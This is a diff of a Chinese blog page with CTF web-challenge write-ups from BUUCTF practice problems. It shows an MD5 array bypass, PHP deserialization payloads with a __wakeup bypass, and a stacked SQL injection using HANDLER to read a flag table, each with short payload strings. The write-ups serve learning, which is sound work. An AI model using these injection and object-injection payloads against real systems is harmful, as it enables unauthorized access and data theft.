+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031656440.png" alt="image-20240103165642369"></p>
+<p>先通过GET方法传入id和gg，值不同但md5值要相同</p>
+<p>接着再用POST方法传入passwd，passwd值要为1234567，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，那直接在后面随便加个字母</p>
+<p>先传入id和gg</p>
+<p><code>/?id[]=1&amp;gg[]=2</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031659394.png" alt="image-20240103165958346"></p>
+<p>表明第一步完成，接着传入passwd，借助HackBar</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031700323.png" alt="image-20240103170040267"></p>
+<p>EXECUTE后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031701777.png" alt="image-20240103170102724"></p>
+<p>得到flag</p>
+
+        <h1 id="十八、-网鼎杯-2020-青龙组-AreUSerialz-1"   >
+          <a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="十八、[网鼎杯 2020 青龙组]AreUSerialz 1"></a>十八、[网鼎杯 2020 青龙组]AreUSerialz 1</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718311.png" alt="image-20240104171810248"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718517.png" alt="image-20240104171824476"></p>
+<p>阅读代码可知，满足条件op=2，执行read读的操作；满足content&lt;100即可绕过；最后用GET方式传参str，而且最后的代码也提示了使用php反序列化</p>
+<p>根据op=2和filename=flag.php写出反序列化代码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op = 2;</span><br><span class="line">    public $filename = &quot;flag.php&quot;;</span><br><span class="line">    public $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new FileHandler());</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>
+
+<p>（此处将三个变量的类型换成了public类型，否则序列化后会产生星号*）运行后得到序列化</p>
+<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code> </p>
+<p>构造payload</p>
+<p><code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
+<p>回车查看网页源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041930727.png" alt="image-20240104193053674"></p>
+<p>得到flag</p>
+
+        <h1 id="十九、-GYCTF2020-Blacklist-1"   >
+          <a href="#十九、-GYCTF2020-Blacklist-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-GYCTF2020-Blacklist-1" class="headerlink" title="十九、[GYCTF2020]Blacklist 1"></a>十九、[GYCTF2020]Blacklist 1</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041951047.png" alt="image-20240104195127003"></p>
+<p>和之前的  四、[强网杯 2019]随便注 1 很相似，但是只能利用open和handler</p>
+<p>输入select</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041955252.png" alt="image-20240104195558198"></p>
+<p>可以看到之前用的 修改表名 和 预处理 所需的关键字都被过滤了</p>
+<p>查询一下表</p>
+<p><code>&#39;;show tables#</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042000563.png" alt="image-20240104200022523"></p>
+<p>直接查询“FlagHere”表的结构</p>
+<p><code>&#39;;show columns from FlagHere#</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042001914.png" alt="image-20240104200132875"></p>
+<p>于是可以构造payload</p>
+<p><code>&#39;;handler</code>FlagHere<code>open as a;handler a read next;#</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041958103.png" alt="image-20240104195836055"></p>
+<p>获得flag</p>
+
+        <h1 id="二十、-极客大挑战-2019-PHP-1"   >
+          <a href="#二十、-极客大挑战-2019-PHP-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-极客大挑战-2019-PHP-1" class="headerlink" title="二十、[极客大挑战 2019]PHP 1"></a>二十、[极客大挑战 2019]PHP 1</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051629835.png" alt="image-20240105162914690"></p>
+<p>提示了我们备份，可以直接下载一下<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip/" >www.zip</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>输入</p>
+<p><code>/www.zip</code></p>
+<p>回车即开始下载</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051631055.png" alt="image-20240105163130011"></p>
+<p>可以看到有三个php文件，分别打开来看</p>
+<p>flag.php：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>index.php:</p>
+<p>重点在</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line"> $select = $_GET[&#x27;select&#x27;];</span><br><span class="line"></span><br><span class="line"> $res=unserialize(@$select);</span><br></pre></td></tr></table></div></figure>
+
+<p>解读一下，用GET方法传入参数select，后面也提示了用反序列化</p>
+<p>class.php:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>即当参数username=’admin’和password=100时才会有flag，编写代码进行序列化</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    //省略部分函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Name(&#x27;admin&#x27;,100); </span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>运行后得到</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051641173.png" alt="image-20240105164108131"></p>
+<p>由于private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p>
+<p>但是在class.php中多了一个wakeup()函数</p>
+<p>绕过_wakeup函数的方法：<em>当成员属性数目大于实际数目时可绕过wakeup方法</em></p>
+<p>所以需要把成员数目的2变成大于2的数字，例如4，即输入</p>
+<p><code>/?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
+<p>回车</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051654105.png" alt="image-20240105165440045"></p>
+<p>得到flag</p>
 </div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2022/01/06/BUU-1/">http://example.com/2022/01/06/BUU-1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E9%99%AAAZ%E7%9A%84WebBUU%E5%88%B7%E9%A2%98/">陪AZ的WebBUU刷题</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">PHP环境搭建</span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">
           一、[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-1"><span class="toc-number">2.</span> <span class="toc-text">
           二、[极客大挑战 2019]Havefun 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-1"><span class="toc-number">3.</span> <span class="toc-text">
@@ -376,4 +663,17 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
           八、[极客大挑战 2019]Knife 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http-1"><span class="toc-number">9.</span> <span class="toc-text">
           九、[极客大挑战 2019]Http 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E6%8F%92%E4%BB%B6HackBar"><span class="toc-number">9.0.1.</span> <span class="toc-text">
           法Ⅰ：利用插件HackBar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A1%EF%BC%9A%E5%88%A9%E7%94%A8Burp-Suite"><span class="toc-number">9.0.2.</span> <span class="toc-text">
-          法Ⅱ：利用Burp Suite</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
+          法Ⅱ：利用Burp Suite</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1"><span class="toc-number">10.</span> <span class="toc-text">
+          十、[极客大挑战 2019]Upload 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload-1"><span class="toc-number">11.</span> <span class="toc-text">
+          十一、[ACTF2020 新生赛]Upload 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81-GXYCTF2019-BabyUpload-1"><span class="toc-number">12.</span> <span class="toc-text">
+          十二、[GXYCTF2019]BabyUpload 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81-MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2-1"><span class="toc-number">13.</span> <span class="toc-text">
+          十三、[MRCTF2020]你传你🐎呢 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81-HCTF-2018-WarmUp-1"><span class="toc-number">14.</span> <span class="toc-text">
+          十四、[HCTF 2018]WarmUp 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-1"><span class="toc-number">15.</span> <span class="toc-text">
+          十五、[极客大挑战 2019]BuyFlag 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A0%EF%BC%9A%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95"><span class="toc-number">15.0.1.</span> <span class="toc-text">
+          法Ⅰ：科学计数法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A1%EF%BC%9A%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">15.0.2.</span> <span class="toc-text">
+          法Ⅱ：数组绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E3%80%81-BJDCTF2020-Easy-MD5-1"><span class="toc-number">16.</span> <span class="toc-text">
+          十六、[BJDCTF2020]Easy MD5 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%83%E3%80%81-MRCTF2020-Ez-bypass-1"><span class="toc-number">17.</span> <span class="toc-text">
+          十七、[MRCTF2020]Ez_bypass 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E5%85%AB%E3%80%81-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz-1"><span class="toc-number">18.</span> <span class="toc-text">
+          十八、[网鼎杯 2020 青龙组]AreUSerialz 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81-GYCTF2020-Blacklist-1"><span class="toc-number">19.</span> <span class="toc-text">
+          十九、[GYCTF2020]Blacklist 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-1"><span class="toc-number">20.</span> <span class="toc-text">
+          二十、[极客大挑战 2019]PHP 1</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
